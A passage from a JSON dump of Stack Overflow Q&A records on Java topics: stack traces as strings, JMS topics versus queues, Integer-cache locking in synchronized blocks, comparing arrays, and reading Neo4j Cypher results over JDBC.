href=\"https://stackoverflow.com/questions/7242596/e-printstacktrace-in-string\" title=\"e printstacktrace in string\">stackoverflow.com/questions/7242596/e-printstacktrace-in-str&zwnj;&#8203;ing</a>"}],"answers":[{"tags":[],"owner":{"account_id":17330117,"reputation":3251,"user_id":12553450,"display_name":"Mafei"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1640265265,"creation_date":1640265265,"answer_id":70462622,"question_id":70462127,"body_markdown":"you can get by using ```StringWriter``` and ```PrintWriter``` like this.\r\n```\r\nStringWriter sw = new StringWriter();\r\nPrintWriter printWriter = new PrintWriter(sw);\r\nyourException.printStackTrace(printWriter);\r\nString errorLogAsString = sw.toString();\r\n```","title":"How to get an error into string same as printed in console in java","body":"<p>you can get by using <code>StringWriter</code> and <code>PrintWriter</code> like this.</p>\n<pre><code>StringWriter sw = new StringWriter();\nPrintWriter printWriter = new PrintWriter(sw);\nyourException.printStackTrace(printWriter);\nString errorLogAsString = sw.toString();\n</code></pre>\n"}],"owner":{"account_id":23728727,"reputation":11,"user_id":17748301,"display_name":"arosh"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":45,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"closed_date":1640300808,"accepted_answer_id":70462622,"answer_count":1,"score":0,"last_activity_date":1640265265,"creation_date":1640262279,"question_id":70462127,"body_markdown":"My requirement is, I have an application that saves the errors into the database to see later time from the dashboard in my own way. therefore, I want to get the happening errors into string same as the error shows the console. I can the message or other stuff from the error object. but it&#39;s not I want. I want to preview the error as the java console shows. ","title":"How to get an error into string same as printed in console in java","body":"<p>My requirement is, I have an application that saves the errors into the database to see later time from the dashboard in my own way. therefore, I want to get the happening errors into string same as the error shows the console. I can the message or other stuff from the error object. but it's not I want. I want to preview the error as the java console shows.</p>\n"},{"tags":["java","jms","message-queue","publish-subscribe","jms-topic"],"answers":[{"tags":[],"owner":{"account_id":60494,"reputation":34013,"user_id":180659,"accept_rate":54,"display_name":"jarnbjo"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640264994,"creation_date":1372779224,"answer_id":17429711,"question_id":17429401,"body_markdown":"You are probably missing that both queues and topics can have multiple subscribers. A queue will deliver the message to one of potentially many subscribers, while a topic will deliver the message to all subscribers.\r\n\r\nIf you in your case are sure that there is only one subscriber, then a queue subscriber and a durable topic subscriber will behave similarly. I would rather look at such a scenario as a &quot;special case&quot;.","title":"JMS Topic vs Queue - Intent","body":"<p>You are probably missing that both queues and topics can have multiple subscribers. A queue will deliver the message to one of potentially many subscribers, while a topic will deliver the message to all subscribers.</p>\n<p>If you in your case are sure that there is only one subscriber, then a queue subscriber and a durable topic subscriber will behave similarly. I would rather look at such a scenario as a &quot;special case&quot;.</p>\n"},{"tags":[],"owner":{"account_id":281082,"reputation":11615,"user_id":577181,"accept_rate":20,"display_name":"John Ament"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1372784565,"creation_date":1372784565,"answer_id":17431553,"question_id":17429401,"body_markdown":"Queues and Topics in JMS represent two different models - point to point and publish/subscribe.  Topics will keep a message until all clients receive them, all subscribers handling them.  Queues will wait for the first consumer to pull the message, and consider it read at that point.","title":"JMS Topic vs Queue - Intent","body":"<p>Queues and Topics in JMS represent two different models - point to point and publish/subscribe.  Topics will keep a message until all clients receive them, all subscribers handling them.  Queues will wait for the first consumer to pull the message, and consider it read at that point.</p>\n"},{"tags":[],"owner":{"account_id":416171,"reputation":31417,"user_id":791406,"accept_rate":69,"display_name":"raffian"},"down_vote_count":0,"up_vote_count":6,"is_accepted":true,"score":6,"last_activity_date":1372824094,"creation_date":1372824094,"answer_id":17439462,"question_id":17429401,"body_markdown":"**The design requirements on when to use queues are simple if you think in terms of real-world examples:**\r\n\r\n - Submit online order (exactly-once processing to avoid charging credit\r\n   card twice)\r\n - Private peer-to-peer chat (exactly one receiver for each message)\r\n - Parallel task distribution (distribute tasks amongst many workers in a networked system)\r\n\r\n**...and examples for when to use topics...**\r\n\r\n - News broadcast to multiple subscribers; notification service, stock ticker, etc.\r\n - Email client (unique durable subscriber; you still get emails when you&#39;re disconnected)\r\n\r\n\r\nYou said...\r\n\r\n&gt; But even in those cases, I may want to use Topic (just to be future\r\n&gt; safe). The only extra case I would have to do is to make (each)\r\n&gt; subscription durable. Or, I special situations, I would use bridging /\r\n&gt; dispatcher mechanism.\r\n\r\nYou&#39;re over-engineering the design. It&#39;s true, you can achieve exactly-once processing using a topic and durable subscriber, but you&#39;d be limited to a *single* durable subscriber; the moment you start another subscriber for that topic, you&#39;ll get duplicate processing for the same message, not to mention, a single durable subscriber is hardly a solution that scales; it would be a bottleneck in your system for sure. With a queue, you can deploy 1000 receivers on 100 nodes for the same queue, and you&#39;d still get exactly-once processing for a single message.\r\n\r\nYou said...\r\n&gt; Give above, I would always (or in most cases) want to publish to a\r\n&gt; topic. Subscriber can be either durable topic(s) or dispatched\r\n&gt; queue(s).\r\n\r\nUsing a dispatched queue with a topic subscriber is sort of redundant. You basically get asynchronous dispatching when using queues, so why not just use a queue?...no reason to put a topic in front of it.\r\n ","title":"JMS Topic vs Queue - Intent","body":"<p><strong>The design requirements on when to use queues are simple if you think in terms of real-world examples:</strong></p>\n\n<ul>\n<li>Submit online order (exactly-once processing to avoid charging credit\ncard twice)</li>\n<li>Private peer-to-peer chat (exactly one receiver for each message)</li>\n<li>Parallel task distribution (distribute tasks amongst many workers in a networked system)</li>\n</ul>\n\n<p><strong>...and examples for when to use topics...</strong></p>\n\n<ul>\n<li>News broadcast to multiple subscribers; notification service, stock ticker, etc.</li>\n<li>Email client (unique durable subscriber; you still get emails when you're disconnected)</li>\n</ul>\n\n<p>You said...</p>\n\n<blockquote>\n  <p>But even in those cases, I may want to use Topic (just to be future\n  safe). The only extra case I would have to do is to make (each)\n  subscription durable. Or, I special situations, I would use bridging /\n  dispatcher mechanism.</p>\n</blockquote>\n\n<p>You're over-engineering the design. It's true, you can achieve exactly-once processing using a topic and durable subscriber, but you'd be limited to a <em>single</em> durable subscriber; the moment you start another subscriber for that topic, you'll get duplicate processing for the same message, not to mention, a single durable subscriber is hardly a solution that scales; it would be a bottleneck in your system for sure. With a queue, you can deploy 1000 receivers on 100 nodes for the same queue, and you'd still get exactly-once processing for a single message.</p>\n\n<p>You said...</p>\n\n<blockquote>\n  <p>Give above, I would always (or in most cases) want to publish to a\n  topic. Subscriber can be either durable topic(s) or dispatched\n  queue(s).</p>\n</blockquote>\n\n<p>Using a dispatched queue with a topic subscriber is sort of redundant. You basically get asynchronous dispatching when using queues, so why not just use a queue?...no reason to put a topic in front of it.</p>\n"}],"owner":{"account_id":82331,"reputation":14750,"user_id":231567,"accept_rate":81,"display_name":"Sandeep Jindal"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":6447,"favorite_count":0,"down_vote_count":1,"up_vote_count":7,"accepted_answer_id":17439462,"answer_count":3,"score":6,"last_activity_date":1640264994,"creation_date":1372778255,"question_id":17429401,"body_markdown":"I am trying to understand the use case of using Queue.\r\n\r\nMy understanding:\r\nQueue means one-to-one. The only use case(if not rare, very few) would be: Message is intended for only one consume. \r\n\r\nBut even in those cases, I may want to use Topic (just to be future safe). The only extra caution would be to make subscriptions durable. Or, in special situations, I would use bridging / dispatcher mechanism.\r\n\r\n\r\nGiven above, I would always (or in most cases) want to publish to a topic. Subscriber can be either durable topic(s) or dispatched queue(s).\r\n\r\n\r\nPlease let me know what I am missing here or I am missing the original intent?","title":"JMS Topic vs Queue - Intent","body":"<p>I am trying to understand the use case of using Queue.</p>\n\n<p>My understanding:\nQueue means one-to-one. The only use case(if not rare, very few) would be: Message is intended for only one consume. </p>\n\n<p>But even in those cases, I may want to use Topic (just to be future safe). The only extra caution would be to make subscriptions durable. Or, in special situations, I would use bridging / dispatcher mechanism.</p>\n\n<p>Given above, I would always (or in most cases) want to publish to a topic. Subscriber can be either durable topic(s) or dispatched queue(s).</p>\n\n<p>Please let me know what I am missing here or I am missing the original intent?</p>\n"},{"tags":["java","synchronized-block"],"comments":[{"owner":{"account_id":108033,"reputation":17201,"user_id":286934,"display_name":"Progman"},"score":0,"creation_date":1640263139,"post_id":70459520,"comment_id":124555960,"body_markdown":"Class names should start in uppercase so they don&#39;t get confused with variable names, which start in lowercase.","body":"Class names should start in uppercase so they don&#39;t get confused with variable names, which start in lowercase."}],"answers":[{"tags":[],"owner":{"account_id":4096887,"reputation":826,"user_id":3363386,"display_name":"polo-language"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640249327,"creation_date":1640249327,"answer_id":70459658,"question_id":70459520,"body_markdown":"When you start the `synchronizedBlock` thread you&#39;ll get a stack trace like this I think:\r\n`run` -&gt; `proces` -&gt; `socketProcess`.\r\nThen because `isRunning2 = true`, the thread will enter an infinite loop in `socketProcess` and never terminate.\r\n\r\nKeep in mind that in Java there is no such thing as &#39;restarting&#39; a `thread`. Once started, a thread can never be restarted. Indeed, you are creating two `sycnchronizedBlock` objects, not restarting a single object.\r\n\r\nAs a side note, it is generally problematic to overwrite static state in a class constructor, as you&#39;re doing with the `locks` variable, without synchronization.","title":"Synchronized block still locked after thread restart","body":"<p>When you start the <code>synchronizedBlock</code> thread you'll get a stack trace like this I think:\n<code>run</code> -&gt; <code>proces</code> -&gt; <code>socketProcess</code>.\nThen because <code>isRunning2 = true</code>, the thread will enter an infinite loop in <code>socketProcess</code> and never terminate.</p>\n<p>Keep in mind that in Java there is no such thing as 'restarting' a <code>thread</code>. Once started, a thread can never be restarted. Indeed, you are creating two <code>sycnchronizedBlock</code> objects, not restarting a single object.</p>\n<p>As a side note, it is generally problematic to overwrite static state in a class constructor, as you're doing with the <code>locks</code> variable, without synchronization.</p>\n"},{"tags":[],"owner":{"account_id":108033,"reputation":17201,"user_id":286934,"display_name":"Progman"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1640264878,"creation_date":1640264878,"answer_id":70462547,"question_id":70459520,"body_markdown":"The issue here is the [`Integer` cache](https://docs.oracle.com/javase/7/docs/api/java/lang/Integer.html#valueOf(int)) which is used in the `for` loop to initialize the `synchronizedBlock.locks` array:\r\n\r\n    for (Integer i = 0; i &lt; 5; i++) {\r\n        synchronizedBlock.locks[i] = i;\r\n    }\r\n\r\nWhen this code is run again, due to the constructor of the second `synchronizedBlock`, the `synchronizedBlock.locks` array contains the **same** `Integer` instances which where created when this `for` loop was executed for the first time. This means that the `synchronized (locks[index])` lock will be on the **same** `Integer` object. As you have already one thread holding the lock for the `Integer(1)` object, the second thread waits outside the `lock` waiting for it to be released.\r\n\r\nThis is also problematic in combination with the fact that the first thread is not terminating. Your method\r\n\r\n    public void socketProces() {\r\n        while (isRunning2) {\r\n        }\r\n    }\r\n\r\nis an endless loop as you don&#39;t change the value of `isRunning2`, ever. Also, the [`interrupt()`](https://docs.oracle.com/javase/7/docs/api/java/lang/Thread.html#interrupt())  method itself does not stop any thread. Instead, it sets just an internal flag in the `Thread` class, which can be checked with [`isInterrupted()`](https://docs.oracle.com/javase/7/docs/api/java/lang/Thread.html#isInterrupted()) and [`interrupted()`](https://docs.oracle.com/javase/7/docs/api/java/lang/Thread.html#interrupted()). You have to check this flag and react on it like &quot;Oh, someone wants me to stop, so I stop now&quot;.\r\n\r\nTo solve your problem you should at least quit your thread when the &quot;isInterrupted&quot; flag of the `Thread` instance is set. You can do it like this:\r\n\r\n    public void socketProces() {\r\n\t    while (isRunning2) {\r\n\t    \tif (Thread.interrupted()) {\r\n\t            return;\r\n\t  \t    }\r\n\t    }\r\n\t}\r\n\r\nInstead of returning from `socketProces()` normally you could throw an `InterruptedException` like other methods do.\r\n\r\nAlso, depending on how you want to initialize/use the instances you want to lock on with `synchronized(...)`, you might want to consider on how you create/fill the `synchronizedBlock.locks` array and which objects you want to use (the `Integer` cache might be problematic here). It depends on you if the  creation of a new `synchronizedBlock` instance will/should/shouldn&#39;t create new objects to lock on in the `synchronizedBlock.locks` array.","title":"Synchronized block still locked after thread restart","body":"<p>The issue here is the <a href=\"https://docs.oracle.com/javase/7/docs/api/java/lang/Integer.html#valueOf(int)\" rel=\"nofollow noreferrer\"><code>Integer</code> cache</a> which is used in the <code>for</code> loop to initialize the <code>synchronizedBlock.locks</code> array:</p>\n<pre><code>for (Integer i = 0; i &lt; 5; i++) {\n    synchronizedBlock.locks[i] = i;\n}\n</code></pre>\n<p>When this code is run again, due to the constructor of the second <code>synchronizedBlock</code>, the <code>synchronizedBlock.locks</code> array contains the <strong>same</strong> <code>Integer</code> instances which where created when this <code>for</code> loop was executed for the first time. This means that the <code>synchronized (locks[index])</code> lock will be on the <strong>same</strong> <code>Integer</code> object. As you have already one thread holding the lock for the <code>Integer(1)</code> object, the second thread waits outside the <code>lock</code> waiting for it to be released.</p>\n<p>This is also problematic in combination with the fact that the first thread is not terminating. Your method</p>\n<pre><code>public void socketProces() {\n    while (isRunning2) {\n    }\n}\n</code></pre>\n<p>is an endless loop as you don't change the value of <code>isRunning2</code>, ever. Also, the <a href=\"https://docs.oracle.com/javase/7/docs/api/java/lang/Thread.html#interrupt()\" rel=\"nofollow noreferrer\"><code>interrupt()</code></a>  method itself does not stop any thread. Instead, it sets just an internal flag in the <code>Thread</code> class, which can be checked with <a href=\"https://docs.oracle.com/javase/7/docs/api/java/lang/Thread.html#isInterrupted()\" rel=\"nofollow noreferrer\"><code>isInterrupted()</code></a> and <a href=\"https://docs.oracle.com/javase/7/docs/api/java/lang/Thread.html#interrupted()\" rel=\"nofollow noreferrer\"><code>interrupted()</code></a>. You have to check this flag and react on it like &quot;Oh, someone wants me to stop, so I stop now&quot;.</p>\n<p>To solve your problem you should at least quit your thread when the &quot;isInterrupted&quot; flag of the <code>Thread</code> instance is set. You can do it like this:</p>\n<pre><code>public void socketProces() {\n    while (isRunning2) {\n        if (Thread.interrupted()) {\n            return;\n        }\n    }\n}\n</code></pre>\n<p>Instead of returning from <code>socketProces()</code> normally you could throw an <code>InterruptedException</code> like other methods do.</p>\n<p>Also, depending on how you want to initialize/use the instances you want to lock on with <code>synchronized(...)</code>, you might want to consider on how you create/fill the <code>synchronizedBlock.locks</code> array and which objects you want to use (the <code>Integer</code> cache might be problematic here). It depends on you if the  creation of a new <code>synchronizedBlock</code> instance will/should/shouldn't create new objects to lock on in the <code>synchronizedBlock.locks</code> array.</p>\n"}],"owner":{"account_id":6576472,"reputation":91,"user_id":5082319,"accept_rate":9,"display_name":"Burak Kocaman"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":75,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1640264878,"creation_date":1640248432,"question_id":70459520,"body_markdown":"I try to restart thread but synchronized block in thread keep locked after restarted. I shouldn&#39;t change socket properties because some processes take too long but when network connection lost it hangs forever. I try to use InterruptedException but it doesn&#39;t work. Is there any way to release this lock?\r\n\r\n    public static void main(String[] args) {\r\n\t\ttry {\r\n\t\t\tsynchronizedBlock t1 = new synchronizedBlock();\r\n\t\t\tt1.start();\r\n\t\t\tThread.sleep(500);\r\n\t\t\tt1.cancel();\r\n\t\t\tt1 = new synchronizedBlock();\r\n\t\t\tt1.start();\r\n\t\t} catch (Exception e) {\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\twhile (true) {\r\n\r\n\t\t}\r\n\t}\r\n\r\n    public class synchronizedBlock extends Thread {\r\n\r\n\t   boolean isRunning = true;\r\n\t   boolean isRunning2 = true;\r\n\t   public static Object[] locks = new Object[5];\r\n\r\n\t   public synchronizedBlock() {\r\n\t\t   for (Integer i = 0; i &lt; 5; i++) {\r\n\t\t   \t   synchronizedBlock.locks[i] = i;\r\n\t\t   }\r\n\t   }\r\n\r\n\t   public void cancel() {\r\n\t\t   isRunning = false;\r\n           interrupt();\r\n\t   }\r\n\r\n\t   public void socketProces() {\r\n\t\t   while (isRunning2) {\r\n\t\t   }\r\n\t   }\r\n\r\n\t   public void proces(int index) {\r\n\t\t   try {\r\n\t\t\t   synchronized (locks[index]) {\r\n\t\t\t\t   System.out.println(&quot;Synchronized Block Begin&quot;);\r\n\t\t\t\t   socketProces();\r\n\t\t\t   }\r\n\t\t   } catch (Exception e) {\r\n\t\t\t   e.printStackTrace();\r\n\t\t   }\r\n\t   }\r\n\r\n\t   @Override\r\n\t   public void run() {\r\n\t\t   try {\r\n\t\t\t   System.out.println(&quot;Run begin&quot;);\r\n\t\t\t   while (isRunning) {\r\n\t\t\t\t   proces(1);\r\n\t\t\t   }\r\n               Thread.sleep(1);\r\n\t\t   } catch (InterruptedException e) {\r\n\t\t\t   //Do Something\r\n\t\t   } catch (Exception e) {\r\n\t\t\t   e.printStackTrace();\r\n\t\t   }\r\n\t   }\r\n    }\r\n\r\nResult:\r\n\r\n    Run begin\r\n    Synchronized Block Begin\r\n    Run begin\r\n","title":"Synchronized block still locked after thread restart","body":"<p>I try to restart thread but synchronized block in thread keep locked after restarted. I shouldn't change socket properties because some processes take too long but when network connection lost it hangs forever. I try to use InterruptedException but it doesn't work. Is there any way to release this lock?</p>\n<pre><code>public static void main(String[] args) {\n    try {\n        synchronizedBlock t1 = new synchronizedBlock();\n        t1.start();\n        Thread.sleep(500);\n        t1.cancel();\n        t1 = new synchronizedBlock();\n        t1.start();\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n    while (true) {\n\n    }\n}\n\npublic class synchronizedBlock extends Thread {\n\n   boolean isRunning = true;\n   boolean isRunning2 = true;\n   public static Object[] locks = new Object[5];\n\n   public synchronizedBlock() {\n       for (Integer i = 0; i &lt; 5; i++) {\n           synchronizedBlock.locks[i] = i;\n       }\n   }\n\n   public void cancel() {\n       isRunning = false;\n       interrupt();\n   }\n\n   public void socketProces() {\n       while (isRunning2) {\n       }\n   }\n\n   public void proces(int index) {\n       try {\n           synchronized (locks[index]) {\n               System.out.println(&quot;Synchronized Block Begin&quot;);\n               socketProces();\n           }\n       } catch (Exception e) {\n           e.printStackTrace();\n       }\n   }\n\n   @Override\n   public void run() {\n       try {\n           System.out.println(&quot;Run begin&quot;);\n           while (isRunning) {\n               proces(1);\n           }\n           Thread.sleep(1);\n       } catch (InterruptedException e) {\n           //Do Something\n       } catch (Exception e) {\n           e.printStackTrace();\n       }\n   }\n}\n</code></pre>\n<p>Result:</p>\n<pre><code>Run begin\nSynchronized Block Begin\nRun begin\n</code></pre>\n"},{"tags":["java","arrays"],"comments":[{"owner":{"account_id":-1,"reputation":1,"user_id":-1,"display_name":"Community"},"score":0,"creation_date":1641057176,"post_id":70460784,"comment_id":124713525,"body_markdown":"Please edit the question to limit it to a specific problem with enough detail to identify an adequate answer.","body":"Please edit the question to limit it to a specific problem with enough detail to identify an adequate answer."}],"answers":[{"tags":[],"owner":{"account_id":18035573,"reputation":1,"user_id":13109071,"display_name":"m.w.a8"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640262725,"creation_date":1640262725,"answer_id":70462193,"question_id":70460784,"body_markdown":"first of all - arrays are primitive and quite a pain if it comes to using them. An alternative would be using ArrayList. But since youre using arrays in this question, this would be an idea to solve the problem:\r\nWhen your arrays are set up you can iterate through them to compare them. To do that you could declare 2 additional arrays:\r\n\r\n    int[] matchesA1A2 = new int[array1.length]; \r\n    int[] matchesAll = new int[array1.length];\r\n\r\nwhere *machesA1A2* will contain the values that are both in array1 and array2. And matchesAll ALL the matching numbers.\r\nNow just iterate through the first array comparing it with the second one to find which values match. Like that:\r\n\r\n    for (int i = 0; i&lt;array1.length; i++){\r\n        for (int i2 = 0; i2&lt;array2.length; i2++){\r\n            if (array1[i]==array2[i2]){\r\n                matchesA1A2[i] = array1[i];\r\n            }\r\n        }\r\n    }\r\n\r\n\r\nThe first two array are now compared. Now you can iterate through the third array comparing it witch the MATCHES of the array1 and array2 (which is the *matchA1A2* array). Like this:\r\n\r\n    for (int i3 = 0; i3&lt;array3.length; i3++){\r\n        for (int im = 0; im&lt;matchesA1A2.length; im++){\r\n            if (array3[i3]==matchesA1A2[im]){\r\n                matchesAll[i3] = array3[i3];\r\n            }\r\n        }\r\n    }\r\n    \r\nIf you println the *matchesAll* array you should see something, like this: [0, 0, 0, number, 0, 0, number, 0, 0]\r\n\r\n    System.out.println(Arrays.toString(matchesAll));\r\n    \r\nAlle the numbers in the array are values that match in all three arrays.\r\n\r\n\r\n*Disclaimer: this is not the best way to write code, but I think because of the way its written it is easier for beginners to understand the concept of iterating.*\r\n","title":"How can I print all common numbers in three inputted user arrays?","body":"<p>first of all - arrays are primitive and quite a pain if it comes to using them. An alternative would be using ArrayList. But since youre using arrays in this question, this would be an idea to solve the problem:\nWhen your arrays are set up you can iterate through them to compare them. To do that you could declare 2 additional arrays:</p>\n<pre><code>int[] matchesA1A2 = new int[array1.length]; \nint[] matchesAll = new int[array1.length];\n</code></pre>\n<p>where <em>machesA1A2</em> will contain the values that are both in array1 and array2. And matchesAll ALL the matching numbers.\nNow just iterate through the first array comparing it with the second one to find which values match. Like that:</p>\n<pre><code>for (int i = 0; i&lt;array1.length; i++){\n    for (int i2 = 0; i2&lt;array2.length; i2++){\n        if (array1[i]==array2[i2]){\n            matchesA1A2[i] = array1[i];\n        }\n    }\n}\n</code></pre>\n<p>The first two array are now compared. Now you can iterate through the third array comparing it witch the MATCHES of the array1 and array2 (which is the <em>matchA1A2</em> array). Like this:</p>\n<pre><code>for (int i3 = 0; i3&lt;array3.length; i3++){\n    for (int im = 0; im&lt;matchesA1A2.length; im++){\n        if (array3[i3]==matchesA1A2[im]){\n            matchesAll[i3] = array3[i3];\n        }\n    }\n}\n</code></pre>\n<p>If you println the <em>matchesAll</em> array you should see something, like this: [0, 0, 0, number, 0, 0, number, 0, 0]</p>\n<pre><code>System.out.println(Arrays.toString(matchesAll));\n</code></pre>\n<p>Alle the numbers in the array are values that match in all three arrays.</p>\n<p><em>Disclaimer: this is not the best way to write code, but I think because of the way its written it is easier for beginners to understand the concept of iterating.</em></p>\n"}],"owner":{"account_id":23727836,"reputation":1,"user_id":17747512,"display_name":"BACOLOD JOSELITO"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":36,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":1,"score":-1,"last_activity_date":1640264826,"creation_date":1640255164,"question_id":70460784,"body_markdown":"```java\r\nint ar1, ar2, ar3;\r\nSystem.out.print(&quot;Enter size of the 1st array: &quot;);\r\n//reading the number of elements from the that we want to enter  \r\nar1 = sc.nextInt();\r\nSystem.out.print(&quot;Enter value of the 1st array: &quot;);\r\nfor (int i = 0; i &lt; ar1; i++) {\r\n    array[i] = sc.nextInt();\r\n}\r\nSystem.out.println(&quot;Array1: &quot;);\r\nfor (int i = 0; i &lt; ar1; i++) {\r\n    System.out.println(array[i] + &quot; &quot;);\r\n}\r\n```\r\n\r\nWhat can I add to print the common numbers in three inputted numbers in arrays?","title":"How can I print all common numbers in three inputted user arrays?","body":"<pre class=\"lang-java prettyprint-override\"><code>int ar1, ar2, ar3;\nSystem.out.print(&quot;Enter size of the 1st array: &quot;);\n//reading the number of elements from the that we want to enter  \nar1 = sc.nextInt();\nSystem.out.print(&quot;Enter value of the 1st array: &quot;);\nfor (int i = 0; i &lt; ar1; i++) {\n    array[i] = sc.nextInt();\n}\nSystem.out.println(&quot;Array1: &quot;);\nfor (int i = 0; i &lt; ar1; i++) {\n    System.out.println(array[i] + &quot; &quot;);\n}\n</code></pre>\n<p>What can I add to print the common numbers in three inputted numbers in arrays?</p>\n"},{"tags":["java","api","jdbc","neo4j","cypher"],"comments":[{"owner":{"account_id":22290225,"reputation":7,"user_id":16517227,"display_name":"Nicola Paganotti"},"score":0,"creation_date":1640267234,"post_id":70461614,"comment_id":124557316,"body_markdown":"It can work if I cast object to Map for retrieve fields key and value.","body":"It can work if I cast object to Map for retrieve fields key and value."}],"answers":[{"tags":[],"owner":{"account_id":1924160,"reputation":5335,"user_id":1734996,"accept_rate":85,"display_name":"Graphileon"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640264690,"creation_date":1640264690,"answer_id":70462508,"question_id":70461614,"body_markdown":"It depends on what you want. Some pointers: \r\n\r\nto return a specific set of properties\r\n\r\n    RETURN b.title AS title, b.foo AS foo\r\n\r\nto return properties as a map:\r\n\r\n    RETURN properties(b) AS map\r\n\r\nto return properties and add the node id.\r\n\r\n    RETURN apoc.map.setKey(properties(b),&#39;id&#39;,id(b)) AS mapWithId\r\n\r\nto return a list of all properties/keys\r\n\r\n    MATCH (b:Book) \r\n    UNWIND keys(b) AS key\r\n    RETURN DISTINCT key\r\n\r\n\r\n\r\n\r\n","title":"cypher query in java: get and iterate resultset nodes","body":"<p>It depends on what you want. Some pointers:</p>\n<p>to return a specific set of properties</p>\n<pre><code>RETURN b.title AS title, b.foo AS foo\n</code></pre>\n<p>to return properties as a map:</p>\n<pre><code>RETURN properties(b) AS map\n</code></pre>\n<p>to return properties and add the node id.</p>\n<pre><code>RETURN apoc.map.setKey(properties(b),'id',id(b)) AS mapWithId\n</code></pre>\n<p>to return a list of all properties/keys</p>\n<pre><code>MATCH (b:Book) \nUNWIND keys(b) AS key\nRETURN DISTINCT key\n</code></pre>\n"}],"owner":{"account_id":22290225,"reputation":7,"user_id":16517227,"display_name":"Nicola Paganotti"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":56,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640264690,"creation_date":1640259375,"question_id":70461614,"body_markdown":"``` \r\npublic class BooksManager {\r\n\t\r\n\t//private final Driver driver;\r\n\tprivate final ConnectionConfig config;\r\n\tprivate Connection con;\r\n\tpublic BooksManager(ConnectionConfig config) {\r\n\t\tthis.config = config;\r\n\t\tthis.con = null;\r\n\t    try {\r\n\t\t\tthis.con = DriverManager.getConnection(&quot;jdbc:neo4j:&quot;+ config.getFullUrl(), &quot;neo4j&quot;, config.getPassword());\r\n\t\t} catch (SQLException e) {\r\n\t\t\t// TODO Auto-generated catch block\r\n\t\t\te.printStackTrace();\r\n\t\t}\r\n\t\t\r\n\t}\r\n\r\npublic void viewBook(){\r\n\tbooksQuery = &quot;USE eindb MATCH (b:Book) RETURN b LIMIT 25&quot;;\r\n\r\n\tPreparedStatement stmt = null;\r\n\ttry {\r\n\t\tstmt = con.prepareStatement(booksQuery);\r\n\t} catch (SQLException e1) {\r\n\t\te1.printStackTrace();\r\n\t}\r\n\t    \r\n\tResultSet rs = null;\r\n\t\t\r\n\ttry {\r\n\t\trs = stmt.executeQuery();\r\n\t} catch (SQLException e2) {\r\n\t\te2.printStackTrace();\r\n\t}\r\n        \r\n\ttry {\r\n\t\twhile (rs.next()) {\r\n\t\t\t\r\n\t\t\tObject bookJustObject = rs.getObject(&quot;b&quot;);\r\n\t\t\tSystem.out.println(&quot;b: &quot;+bookJustObject);\r\n\t\t\t//TODO get all fields from object, how?\t\r\n\t\t}\r\n\r\n\t} catch (SQLException e1) {\r\n\t\te1.printStackTrace();\r\n\t}\r\n}\r\n\r\n\r\n```\r\nI execute successfull query which return some books. \r\nQuery run with jdbc connection for neo4j database.\r\nI don&#39;t understand how to list all fields from object &quot;b&quot; which represents a book in graph database.","title":"cypher query in java: get and iterate resultset nodes","body":"<pre><code>public class BooksManager {\n    \n    //private final Driver driver;\n    private final ConnectionConfig config;\n    private Connection con;\n    public BooksManager(ConnectionConfig config) {\n        this.config = config;\n        this.con = null;\n        try {\n            this.con = DriverManager.getConnection(&quot;jdbc:neo4j:&quot;+ config.getFullUrl(), &quot;neo4j&quot;, config.getPassword());\n        } catch (SQLException e) {\n            // TODO Auto-generated catch block\n            e.printStackTrace();\n        }\n        \n    }\n\npublic void viewBook(){\n    booksQuery = &quot;USE eindb MATCH (b:Book) RETURN b LIMIT 25&quot;;\n\n    PreparedStatement stmt = null;\n    try {\n        stmt = con.prepareStatement(booksQuery);\n    } catch (SQLException e1) {\n        e1.printStackTrace();\n    }\n        \n    ResultSet rs = null;\n        \n    try {\n        rs = stmt.executeQuery();\n    } catch (SQLException e2) {\n        e2.printStackTrace();\n    }\n        \n    try {\n        while (rs.next()) {\n            \n            Object bookJustObject = rs.getObject(&quot;b&quot;);\n            System.out.println(&quot;b: &quot;+bookJustObject);\n            //TODO get all fields from object, how? \n        }\n\n    } catch (SQLException e1) {\n        e1.printStackTrace();\n    }\n}\n\n\n</code></pre>\n<p>I execute successfull query which return some books.\nQuery run with jdbc connection for neo4j database.\nI don't understand how to list all fields from object &quot;b&quot; which represents a book in graph database.</p>\n"},{"tags":["java","mysql","object","types"],"comments":[{"owner":{"account_id":7848,"reputation":108920,"user_id":13792,"accept_rate":100,"display_name":"ColinD"},"score":3,"creation_date":1272657158,"post_id":2747203,"comment_id":2776849,"body_markdown":"Note that it&#39;s generally not a good idea to store a serialized object in a database (other than maybe temporarily) because a change to the class of the object could make the serialized object stored in the database incompatible with it.","body":"Note that it&#39;s generally not a good idea to store a serialized object in a database (other than maybe temporarily) because a change to the class of the object could make the serialized object stored in the database incompatible with it."},{"owner":{"account_id":56256,"reputation":53237,"user_id":168493,"accept_rate":92,"display_name":"Marcus Adams"},"score":1,"creation_date":1272658804,"post_id":2747203,"comment_id":2777028,"body_markdown":"That sure would make things easy. Look into ORM or OODBMS. http://en.wikipedia.org/wiki/Object-relational_mapping and http://en.wikipedia.org/wiki/Object_database","body":"That sure would make things easy. 